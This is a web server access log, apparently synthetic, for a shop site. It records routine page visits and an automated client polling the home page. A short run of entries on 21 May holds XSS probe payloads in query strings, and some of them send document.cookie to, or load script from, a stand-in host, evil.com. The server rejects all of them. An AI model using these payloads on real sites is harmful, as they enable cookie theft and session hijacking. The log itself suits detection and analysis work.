46.101.93.64 - - [20/May/2026:13:40:50 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [20/May/2026:14:00:07 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [20/May/2026:16:30:00 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:06 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:12 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:18 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:24 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:30 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:36 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:42 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:48 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:30:54 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:00 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:06 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:12 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:18 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:24 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:30 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:36 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:42 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:48 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:31:54 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:00 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:06 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:12 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:18 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:24 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:30 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:36 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:42 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:48 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
198.51.100.77 - - [20/May/2026:16:32:54 +0000] "GET / HTTP/1.1" 200 4523 "-" "Go-http-client/1.1"
10.0.1.50 - - [20/May/2026:16:45:11 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [20/May/2026:17:00:28 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [20/May/2026:17:15:44 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.52 - - [20/May/2026:17:30:01 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [21/May/2026:08:10:17 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [21/May/2026:08:25:34 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [21/May/2026:08:40:51 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
46.101.93.64 - - [21/May/2026:08:55:08 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [21/May/2026:09:00:24 +0000] "POST /login HTTP/1.1" 200 512 "https://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:15:03 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:15:41 +0000] "GET /comment?text=<img src=x onerror=alert(document.cookie)> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:16:19 +0000] "GET /profile?name=%3Cscript%3Ealert%28xss%29%3C%2Fscript%3E HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:16:57 +0000] "GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:17:35 +0000] "GET /feedback?msg=<svg/onload=alert(1)> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:18:13 +0000] "GET /search?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:18:51 +0000] "GET /profile?bio=javascript:alert('xss') HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:19:29 +0000] "GET /search?q=<body+onload=alert(1)> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:20:07 +0000] "GET /comment?text=%3Cscript+src%3D%22https%3A%2F%2Fevil.com%2Fxss.js%22%3E%3C%2Fscript%3E HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.55 - - [21/May/2026:09:20:45 +0000] "GET /profile?name=<script>fetch('https://evil.com/steal?k='+btoa(document.cookie))</script> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [21/May/2026:09:30:41 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [21/May/2026:09:45:58 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.1.50 - - [21/May/2026:10:00:14 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [21/May/2026:10:15:31 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [21/May/2026:10:30:47 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [21/May/2026:10:45:04 +0000] "POST /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [21/May/2026:11:00:21 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [21/May/2026:11:15:37 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [21/May/2026:11:30:54 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.1.50 - - [21/May/2026:11:45:11 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [21/May/2026:12:00:28 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.100.10 - - [21/May/2026:12:15:44 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [21/May/2026:12:30:01 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [21/May/2026:12:45:18 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
104.21.45.67 - - [21/May/2026:13:00:34 +0000] "GET /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [21/May/2026:13:15:51 +0000] "GET /static/css/main.css HTTP/1.1" 200 45231 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [21/May/2026:13:30:07 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [21/May/2026:13:45:24 +0000] "POST /login HTTP/1.1" 200 512 "https://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [21/May/2026:14:00:41 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
46.101.93.64 - - [21/May/2026:14:15:57 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [21/May/2026:14:30:14 +0000] "GET /nonexistent HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [21/May/2026:14:45:31 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [21/May/2026:15:00:47 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.1.50 - - [21/May/2026:15:15:04 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [21/May/2026:15:30:21 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [21/May/2026:15:45:37 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [21/May/2026:16:00:54 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [21/May/2026:16:15:11 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [21/May/2026:16:30:27 +0000] "POST /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [21/May/2026:16:45:44 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.1.50 - - [21/May/2026:17:00:01 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [21/May/2026:17:15:17 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
